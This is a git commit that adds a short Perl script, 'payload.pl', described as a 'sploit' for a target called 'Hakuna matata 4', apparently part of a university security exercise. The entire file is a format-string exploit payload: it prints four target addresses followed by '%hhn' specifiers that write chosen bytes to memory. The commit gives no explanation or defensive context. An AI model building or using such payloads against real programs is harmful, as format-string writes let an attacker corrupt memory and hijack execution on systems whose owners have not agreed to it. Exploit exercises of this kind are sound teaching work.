64b44187e09b114512ace63a0953870004555a67
Ahmad Hazimeh <ahmad.hazimeh@epfl.ch>
2019-04-25 21:17:13 +0200

    Added sploit for Hakuna matata 4

---
+++ sploits/sploit_4/payload.pl
@@ -0,0 +1,8 @@
+print "\x16\x70\x58\x56AAAA";
+print "\x17\x70\x58\x56AAAA";
+print "\x14\x70\x58\x56AAAA";
+print "\x15\x70\x58\x56";
+print "%053c%92\$hhn";
+print "%01c%94\$hhn";
+print "%017c%96\$hhn";
+print "%091c%98\$hhn";
